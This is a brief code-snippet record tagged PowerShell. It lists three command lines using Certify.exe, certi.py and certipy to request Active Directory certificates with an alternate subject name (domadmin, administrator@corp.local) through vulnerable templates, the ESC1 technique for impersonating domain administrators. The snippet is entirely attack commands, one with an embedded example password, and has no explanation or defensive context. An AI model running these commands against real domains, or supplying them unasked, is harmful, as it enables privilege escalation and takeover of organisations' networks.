---
id: 22011ffe-36ac-4178-8346-f3eefae0e45c
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:05.731933+00:00'
updated_at: '2023-04-10T20:25:45.492561+00:00'
---

# Code Snippet 22011ffe

**Language**: ps1

```ps1
# request certificates for the machine account by executing Certify with the "/machine" argument from an elevated command prompt.
Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
```


